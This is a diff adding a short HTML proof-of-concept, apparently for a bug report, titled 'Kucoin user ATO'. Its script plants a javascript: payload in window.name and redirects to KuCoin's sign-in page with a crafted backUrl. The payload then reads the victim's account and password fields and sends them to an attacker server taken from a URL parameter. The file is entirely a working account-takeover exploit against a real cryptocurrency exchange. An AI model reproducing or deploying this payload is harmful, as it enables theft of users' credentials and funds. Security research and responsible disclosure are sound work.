@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Kucoin user ATO</title>
+  </head>
+  <body>
+    <script>
+      let ATTACKER_SERVER = new URLSearchParams(location.search).get("url");
+      window.name = `javascript:var account = document.getElementById("account").value,
+      password = document.getElementById("password").value;    
+
+    new Image().src =
+      "${ATTACKER_SERVER}" +
+      "?victimEmail=" +
+      account +
+      "/victimPassword=" +
+      password;alert(11)`;
+
+      window.location =
+        "https://www.kucoin.com/ucenter/signin?backUrl=javascript%253Avar%2520location%253Dname%252F%252F%250Ahttps%253A%252F%252Fsupport.kucoin.plus";
+    </script>
+  </body>
+</html>
+ss
